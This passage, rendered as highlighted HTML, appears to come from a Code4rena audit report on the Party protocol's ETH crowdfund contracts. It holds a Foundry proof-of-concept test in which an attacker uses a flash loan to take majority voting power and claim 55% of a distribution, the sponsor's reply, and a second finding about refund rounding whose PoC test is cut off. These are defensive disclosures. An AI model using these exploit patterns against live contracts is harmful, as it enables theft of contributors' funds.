    </span><span class=\"mtk12\">globals</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LibGlobals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">GLOBAL_TOKEN_DISTRIBUTOR</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributor</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Party</span><span class=\"mtk1\"> </span><span class=\"mtk12\">party</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">party</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Attacker has 1 ether now</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// An honest member has 9 ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">member</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk7\">9</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Contribute</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vp1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">contribute</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">contribute</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">9</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Attacker noticed his voting power will be 10% after finalization, so he decided to contribute 10 ether using flashloan</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// he borrowed 10 ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vp2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">contributeFor</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">), </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//contributed 10 ether again</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Crowdfund is finalized</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCrowdfundLifecycle</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">ETHCrowdfundBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">CrowdfundLifecycle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Finalized</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGovernanceValues</span><span class=\"mtk1\">().</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">, </span><span class=\"mtk7\">20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vp1</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">vp2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">11</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//his voting power is 11/20 = 55% now</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">party</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//attacker&#39;s eth balance = 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// attacker starts eth distribution of 19 ether from party&#39;s balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ITokenDistributor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">DistributionInfo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk7\">19</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ITokenDistributor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TokenType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Native</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributor</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">19</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//distributor&#39;s balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">party</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//party&#39;s remaining balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">distributor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distInfo</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//attacker claims 55% of 19 ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10.45</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//finally, attacker&#39;s balance = 10.45 ether and he can repay the flashloan</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGovernanceValues</span><span class=\"mtk1\">().</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">, </span><span class=\"mtk7\">20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vp1</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">vp2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">11</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//his voting power is still 55%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1515472420\">0xble (Party) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Great finding, still debating the mitigation internally.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1532040736\">0xble (Party) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Looking into this more, the issue can only occur if a party sets an <code>executionDelay</code> of 0. In the POC, the party was created with default values (null) which is why this could happen in testing. However if changed to a nonzero value, it would require waiting delay duration before the proposal could be executed which would prevent the repayment of the flash loan in a single execution. Since parties are expected to have a nonzero execution delay, we are less concerned about the flash loan aspect of this attack.</p>\n<p>This finding did prompt us to consider the risk of majority attacks more broadly, where an individual can contribute and become a majority voter in a party (flash loan or not) and take control of the party. We acknowledged the majority attack before audit and don’t consider it a vulnerability. Our reasoning is (1) our governance model prioritizes simplicity and speed of coordination which would be sacrificed by introducing more complex mechanisms to robustly protect against majority attacks and (2) the expectation is parties will have reasonable governance settings and active governance to veto malicious proposals to manage the risk of a majority attack and if they don’t (e.g. set an execution delay of 0) it is a deliberate choice on their part rather than a vulnerability.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-03-users-wouldnt-refund-from-the-lost-eth-crowdfunds-due-to-the-lack-of-eth\" style=\"position:relative;\"><a href=\"#h-03-users-wouldnt-refund-from-the-lost-eth-crowdfunds-due-to-the-lack-of-eth\" aria-label=\"h 03 users wouldnt refund from the lost eth crowdfunds due to the lack of eth permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/15\">[H-03] Users wouldn’t refund from the lost ETH crowdfunds due to the lack of ETH</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/15\">hansfriese</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/40\">0x52</a> and <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/26\">evan</a></em></p>\n<p>After the ETH crowdfunds are lost, contributors wouldn’t refund their funds because the crowdfunds contract doesn’t have enough ETH balance.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The core flaw is <code>_calculateRefundAmount()</code> might return more refund amount than the original contribution amount.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_calculateRefundAmount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">exchangeRateBps</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Add back fee to contribution amount if applicable.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundingSplitRecipient_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fundingSplitRecipient</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fundingSplitBps</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">fundingSplitRecipient_</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">) / (</span><span class=\"mtk7\">1e4</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit might be greater than original contribution</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>When users contribute to the ETH crowdfunds, it subtracts the fee from the contribution amount.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">04</span><span class=\"mtk1\">-</span><span class=\"mtk12\">party</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ETHCrowdfundBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">226</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fundingSplitBps</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">227</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">fundingSplitRecipient_</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">228</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">230</span><span class=\"mtk1\">:         }</span></span></span></code></pre>\n<p>During the calculation, it calculates <code>feeAmount</code> first which is rounded down and subtracts from the contribution amount. It means the final amount after subtracting the fee would be rounded up.</p>\n<p>So when we calculate the original amount using <code>_calculateRefundAmount()</code>, we might get a greater value.</p>\n<p>This shows the detailed example and POC.</p>\n<ol>\n<li>Let’s assume <code>fundingSplitBps = 1e3(10%), exchangeRateBps = 1e4</code>.</li>\n<li>A user contributed <code>1e18 - 1</code> wei of ETH. After subtracting the fee, the voting power was <code>1e18 - 1 - (1e18 - 1) / 10 = 9 * 1e17</code></li>\n<li>Let’s assume there are no other contributors and the crowdfund was lost.</li>\n<li>When the user calls <code>refund()</code>, the refund amount will be <code>9 * 1e17 * 1e4 / 9000 = 1e18</code> in <code>_calculateRefundAmount()</code></li>\n<li>So it will try to transfer 1e18 wei of ETH from the crowdfund contract that contains 1e18 - 1 wei only. As a result, the transfer will revert and the user can’t refund his funds.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_refund_reverts</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">InitialETHCrowdfund</span><span class=\"mtk1\"> </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createCrowdfund</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialContribution:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialContributor:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialDelegate:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">minContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">maxContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint96</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">disableContributingForExistingCard:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">minTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">3</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">maxTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">duration:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fundingSplitBps:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">, </span><span class=\"mtk3\">//10% fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fundingSplitRecipient:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">()) </span><span class=\"mtk3\">//recipient exists</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Party</span><span class=\"mtk1\"> </span><span class=\"mtk12\">party</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">party</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span 